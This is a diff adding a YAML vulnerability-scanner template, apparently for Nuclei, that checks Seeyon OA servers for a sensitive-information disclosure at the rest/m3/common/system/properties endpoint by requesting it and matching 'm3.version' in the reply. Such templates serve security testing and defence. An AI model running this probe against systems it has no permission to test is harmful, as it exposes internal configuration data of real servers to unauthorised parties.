@@ -1,0 +1,19 @@
+id: seeyon-system-lfi
+info:
+  name: 致远OA rest/m3/common/system/properties接口存在敏感信息泄露漏洞
+  author: wangzong
+  severity: high
+  description: 致远OA rest/m3/common/system/properties接口存在敏感信息泄露漏洞
+  reference:
+    - https://github.com/wwwCar/poc/blob/main/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%E4%B8%80%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/seeyon/rest/m3/common/system/properties"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'm3.version'
